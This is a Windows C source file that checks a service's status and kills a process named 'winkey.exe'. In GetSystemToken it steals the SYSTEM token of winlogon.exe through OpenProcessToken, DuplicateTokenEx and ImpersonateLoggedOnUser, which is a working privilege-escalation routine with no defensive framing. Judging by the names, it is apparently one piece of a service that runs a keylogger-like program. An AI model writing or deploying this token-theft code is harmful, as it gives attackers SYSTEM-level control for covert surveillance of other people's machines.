#include <svc.h>
#include <winnt.h>

int     is_service_running(void)
{
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM)
    {
        DBG("OpenSCManager failed: %lu\n", GetLastError());
        return (-1);
    }

    SC_HANDLE hService = OpenService(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
    if (!hService)
    {
        DBG("Open service failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        return (-1);
    }

    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded = 0;

    if (!QueryServiceStatusEx(
            hService,                       // service handle
            SC_STATUS_PROCESS_INFO,         // request service status info
            (LPBYTE)&ssp,                   // buffer that receive status
            sizeof(SERVICE_STATUS_PROCESS), // buffer size
            &bytesNeeded                    // number of bytes returned
    ))
    {
        DBG("QueryServiceStatusEx failed: %lu\n", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (-1);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (ssp.dwCurrentState == SERVICE_RUNNING)
        return (1);
    return (0);
}

static DWORD   GetProcessPid(char *ProcName)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return (0);

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // get first process on snapshot
    if (Process32First(hSnap, &pe))
    {
        while (TRUE)
        {
            // check winlogon process
            if (_stricmp(pe.szExeFile, ProcName) == 0)
            {
                pid = pe.th32ProcessID;
                break ;
            }
            if (!Process32Next(hSnap, &pe)) // check next process
                break ;
        }
    }

    CloseHandle(hSnap);
    return (pid);
}

void    KillWinkeyPID(void)
{
    //DWORD   sessionID = WTSGetActiveConsoleSessionId();
    DWORD   pid = GetProcessPid("winkey.exe");

    HANDLE hProcess = OpenProcess (
        PROCESS_TERMINATE,
        FALSE,
        pid
    );

    if (!TerminateProcess(hProcess, pid))
        DBG("Error TerminateProcess: %lu\n", GetLastError());
}


HANDLE  GetSystemToken(void)
{
    //DWORD   sessionID = WTSGetActiveConsoleSessionId(); // session 0
    DWORD   pid = GetProcessPid("winlogon.exe");    
    
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, 
        FALSE, 
        pid);

    if (!hProcess)
    {
        DBG("OpenProcess failed: %lu\n", GetLastError());
        return 0;
    }

    // open token winlogon
    HANDLE hToken = NULL;
    if (!OpenProcessToken(
        hProcess, 
        TOKEN_ALL_ACCESS, 
        &hToken))
    {
        DBG("OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hToken);
        return 0;
    }

    if (!DuplicateTokenEx(
        hToken,
        TOKEN_ALL_ACCESS,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hToken
    ))
    {
        DBG("DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hToken);
        return 0;
    }

    if (!ImpersonateLoggedOnUser(hToken))
    {
        DBG("ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hToken);
        return 0;
    }
    
    return (hToken);
}